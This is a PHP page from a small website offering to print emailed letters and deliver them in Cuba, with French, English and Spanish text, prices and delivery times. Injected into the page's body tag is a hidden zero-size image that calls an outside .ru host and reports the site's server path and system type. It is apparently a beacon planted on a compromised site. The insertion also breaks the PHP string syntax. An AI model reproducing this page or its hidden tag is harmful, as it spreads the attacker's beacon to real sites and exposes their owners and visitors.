<?php
// @(#) $Id$
// +-----------------------------------------------------------------------+
// | Copyright (C) 2011, http://cosat.biz                           |
// +-----------------------------------------------------------------------+
// | This file is free software; you can redistribute it and/or modify     |
// | it under the terms of the GNU General Public License as published by  |
// | the Free Software Foundation; either version 2 of the License, or     |
// | (at your option) any later version.                                   |
// | This file is distributed in the hope that it will be useful           |
// | but WITHOUT ANY WARRANTY; without even the implied warranty of        |
// | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the          |
// | GNU General Public License for more details.                          |
// +-----------------------------------------------------------------------+
// | Author: Denis Léveillé                                                        |
// +-----------------------------------------------------------------------+
//
/* Programme : TRanSactionCALculFeNeTre.php
* Description : Programme d'ajout de client.
* Auteur : Denis Léveillé 	 		  Date : 2007-03-28
 */
include('lib/config.php');

$txt = textes($_SESSION['langue']);
$param = &$__PARAMS;

echo 
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
	<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
<body  onload='javascript:pageonload()'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='12' cellspacing='0' align='$Enligne' border='0' >";
?>
<tr>
<td valign=top>

<? if($_SESSION['langue']=="fr"){?>
<b>SERVICE DE COURRIEL   POSTE</b>

ÉCRIVEZ À VOS PROCHES, Écrivez votre lettre et envoyez-la nous par courriel.  Nous imprimons votre courriel sur un joli papier a lettre, nous la mettons dans une enveloppe et la faisons parvenir au destinataire à Cuba.
<br><br>
N'OUBLIEZ PAS D'INSCIRE L'ADRESSE DE LIVRAISON AINSI QUE LE NOM DE LA PERSONNE A QUI LA LIVRAISON DOIT ETRE FAITE.
<br><br>
Le délai de livraison est de 2 à 5 jours ouvrables.
<br><br>
Les coûts :
<ul>
<li> 1 à 3 pages - 5.00$ USD
<li> 3 à 5 pages - 7.00$ USD
<li> plus de 5 pages :Si vous désirez envoyez un document de plus de 5 pages veuillez le faire parvenir a nos bureaux
<br>Documents et photos : Havane 20$ USD, Province 30$ USD
</ul>
<br><br>
<?} if($_SESSION['langue']=="en"){?>
<b>POST SERVICE</b>
WRITE TO YOUR LOVES ONES. Write your letter and send it to us by email. We will print you letter on a nice paper, put it in an envelop and send it to your destinatary in Cuba.
<br><br>
DO NOT FORGET TO WRITE THE DELIVERY ADDRESS AND THE NAME OF THE RECIPIENT.
<br><br>
The delivery time is 2 to 5 working days.
<br><br>
The cost:
<ul>
<li> 1 to 3 pages - 5.00$ USD
<li> 3 to 5 pages - 7.00$ USD
<li> more then 5 pages:If you want to send a document of more then 5 pages please send it to our office and will deliver it to Cuba
<br>
Documents and pictures : Habana 20$ USD, Province:30$ USD
</ul>
<br><br>
<?} if($_SESSION['langue']=="sp"){?>
<b>SERVICIO DE CORREO</b>
<br><br>
Escriba a sus queridos. Escriba su carta y mandala a nuestra officina  por  correo electronico. Imprimemos sur carta y la ponemos en un sobre y la entregamos alsu destinatario en Cuba.
<br><br>
IMPORTANTE, INSCRIBIR LA DIRECION DE ENTREGA Y EL NOMBRE DE LA PERSONA A QUIEN SE DEBE ENTREGAR LA CARTA.
<br><br>
El tiempo de entrega es de 2 a 5 dias laborables.
<br><br>
Los costos :
<ul>
<li> 1 to 3 pajinas - 5.00$ USD
<li> 3 to 5 pajinas - 7.00$ USD
<li> mas de 5 pajinas :Si ustedes tiene mas de 5 pajinas, por favor mandar su documento a nuestra oficina y lo enviamos a la persona en Cuba.
<br>
Documentos y fotos: Habana 20$ USD, Provincia 30$ USD
</ul>
<br><br>
<?}?>
<center>
<a href='construction.html'><big><b>
<!-- a href='criba.php' -->
<? if($_SESSION['langue']=="fr"){?>
Envoyer un courrier X-CRIBA MAINTENANT !
<?} if($_SESSION['langue']=="en"){?>
Send a X-CRIBA Courrier NOW !
<?} if($_SESSION['langue']=="sp"){?>
Envía un X-CRIBA Courrier NOW!
<?}?></b></big>
</a>
</center>




		</td>
	</tr>
  	<tr> 
    	<td>
			<?php include("bas_page.inc"); ?>
		</td>
  	</tr>
</table>
<script language="javascript">

function Rafraichie(){
	open( "paquet_calcul.php", "_self" );
//	document.forms["Menu"].submit();
}

function pageonload() {
	<?php
          if( isset($NewMessage) ) {
	    	echo "	alert(\"$NewMessage\"); ";
          	unset( $NewMessage );
          }
        ?>
}

addKeyEvent();

</script>
<SCRIPT language=JavaScript1.2 src='./extra/javafich/blokclick.js'></SCRIPT>


</body>
</html>		